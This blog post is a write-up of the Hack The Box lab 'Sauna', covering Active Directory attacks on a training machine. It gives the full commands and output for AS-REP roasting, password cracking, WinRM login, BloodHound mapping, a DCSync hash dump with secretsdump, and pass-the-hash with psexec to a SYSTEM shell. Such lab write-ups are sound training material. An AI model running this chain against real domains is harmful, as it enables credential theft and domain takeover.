---
layout: single
title: "Hack The Box Write-up #3 : Sauna"
excerpt: "Writeup for Sauna , HacktheBox"
date: 2020-07-24
toc: true
toc_sticky: true
header:
  tagline: "Writeup for Sauna , HacktheBox"
  overlay_image: /assets/images/background.jpg
  overlay_filter: 0.5
  actions:
    - label: "More Info"
      url: "https://www.hackthebox.eu/home/machines/profile/229"
  teaser: /assets/images/sauna-walkthrough/sauna.png
  teaser_home_page: true
  
categories:
  - hackthebox
  - infosec
tags:  
  - windows
  - activedirectory
  - redteam
---

![Card](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/sauna-walkthrough/sauna.png)

## Summary

Sauna was quite a fun and interesting machine to do provided by HackTheBox aiming to teach you some basic concepts about Red Teaming and Active Directory Exploitation.
User comes with a pretty real life vector attack where some workers are presented on a Bank webpage where we had to guess their usernames based on the Full Names provided on the webpage. Root represents an usual mistake while setting user privilege where an user in the machine has DCSync rights over the domain.

## Enumeration 

As the default routine I would start with a nmap scan to check for the interesting results.

```
pi0x73@kali:~$ nmap -sC -A 10.10.10.175
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-24 23:26 CEST
Nmap scan report for 10.10.10.175
Host is up (0.079s latency).
Not shown: 988 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-07-25 04:30:33Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=7/24%Time=5F1B5236%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h03m17s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-07-25T04:32:56
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 326.61 seconds
```

The ports provided to be open , makes it easy to guess that We have to do with an Active Directory environiment.
Beside that we are provided with a http webpage where we can possibly gain some information needed for usual exploitation.

## Webpage

![web](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/sauna-walkthrough/sauna1.png)

We are simply provided with a webpage representing a bank with not much interesting information except the ``about us`` part :

![aboutus](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/sauna-walkthrough/sauna2.png)

We can notice the names of the workers easily under each of their picture.
I saved the names for lateral use thinking they will be useful and started to google about the username format that is mostly used on an AD environiment and luckily came up with this :

![usernameformat](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/sauna-walkthrough/sauna3.png)

As seen above from a forum reply I found somewhere , the usual format for an username would be : First Letter of the First Name + Last Name (ex. Fergus Smith = fsmith)
Following this order , I tried to generate usernames based on the names provided to us and saved them to a file. 

Next guess since this is presented as an easy box , we could try kerberoasting against the usernames created and see if we could hit somewhere : 

```
alt@kali:/usr/share/doc/python3-impacket/examples$ python3 GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -no-pass -request -usersfile /home/alt/userlist-sauna.txt -dc-ip 10.10.10.175
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:04df0f9e2335fe90b76c55592d51ca6c$bfe1299b17d8402cd72f883eb7d44b5a7db37df877747193d74b932493bcc630519793f08561c8ecc99bcc919acad3ad8765451757711f69426da93f5841019d4091154dbe3cc75b937d92c5848a673204cc433d40808ed8e978519124dbc649c025c6c2825f0e823d585b9287f82ff801883407b275030c358a7d7cf863dbc60c2170717e4090be13195738bb488a183039327da6666b3d6f4bb41f6acea2056da91989f578ad4b5687138bf9913e7ada84f4d9263b13eb463d99d7b099d01d5bc5d3217c0a0b76a64b6fa9a0809d7990ad5e6f05a25abd063727429088a6e99331008dde7d5ffa515e9ca4f6d2dbf80cd500e4e4c0971db046886d0285f7c6
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
alt@kali:/usr/share/doc/python3-impacket/examples$
```

And there we go, a hash provided from the attack which we can possibly use to login for the user ``fsmith``

Let's go ahead and save the hash to a file then use john or hashcat to crack it and come up with a plaintext password : 

![hash](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/sauna-walkthrough/sauna4.png)

Password Cracked : ``Thestrokes23``

Now we can finally try to use the credentials against the winrm protocol since we noticed its up and running on its default port : 

```
alt@kali:~$ evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\FSmith\Documents> type ../Desktop/user.txt
1b5520b98d97cf17f24122a55baf70cf
*Evil-WinRM* PS C:\Users\FSmith\Documents> 
```

Succesfully logged in as expected and with that I am free to grab the user hash and start working for lateral movement on the machine.

## Lateral Movement

After getting one foot inside the machine I would like to run **WinPeas** (Enumeration Tool for Windows Privilege Escalation) to check for possible paths since I wasnt able to figure out a way manually :

![winpeas](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/sauna-walkthrough/winpeas.png)

After running , some credentials popped for an AD user : ``svc_loanmgr:Moneymakestheworldgoround!``


```
root@kali:~# evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> upload /opt/pentesting/BloodHound/Ingestors/SharpHound.exe
Info: Uploading /opt/pentesting/BloodHound/Ingestors/SharpHound.exe to C:\Users\svc_loanmgr\Documents\SharpHound.exe

                                                             
Data: 1111380 bytes of 1111380 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> .\SharpHound.exe
-----------------------------------------------
Initializing SharpHound at 1:22 PM on 7/11/2020
-----------------------------------------------
```

I was able to login with the user credentials and ran **Bloodhound** as seen above to find a possible path to **Administrator**
After the dump was complete I imported the database to my machine to check the domain forest relations to the Administrating Account.

![hound](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/sauna-walkthrough/hound.png)

Quickly I noticed this relation of my current account (**svc_loanmgr**) with the domain.
I have **GetChanges** and **GetChangesAll** Permission over the domain which could let me dump a list of NTLM hashes from the system.

I can simply use **secretsdump.py** from Impacket to do that. 

```
root@kali:~# /usr/share/doc/python3-impacket/examples/secretsdump.py svc_loanmgr@10.10.10.175
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:a7689cc5799cdee8ace0c7c880b1efe3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031
Administrator:aes128-cts-hmac-sha1-96:145e4d0e4a6600b7ec0ece74997651d0
Administrator:des-cbc-md5:19d5f15d689b1ce5
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:5f39f2581b3bbb4c79cd2a8f56e7f3427e707bd3ba518a793825060a3c4e2ef3
SAUNA$:aes128-cts-hmac-sha1-96:c628107e9db1c3cb98b1661f60615124
SAUNA$:des-cbc-md5:104c515b86739e08
[*] Cleaning up...
```

## Gaining System Shell

After all of the hashes have been dumped what I need to use is the **Administrator** hash to grab a system shell in the machine and own the forest :

```
root@kali:~# /usr/share/doc/python3-impacket/examples/psexec.py administrator@10.10.10.175 -hashes d9485863c1e9e05851aa40cbb4ab9dff:d9485863c1e9e05851aa40cbb4ab9dff
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on 10.10.10.175.....
[*] Found writable share ADMIN$
[*] Uploading file GNRWPFak.exe
[*] Opening SVCManager on 10.10.10.175.....
[*] Creating service APMT on 10.10.10.175.....
[*] Starting service APMT.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.973]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>type \users\administrator\desktop\root.txt
f3ee04965c68257382e31502cc5e881f
```
I am succesfully logged in as the domain admin and I can use the hash to mark the machine as owned!
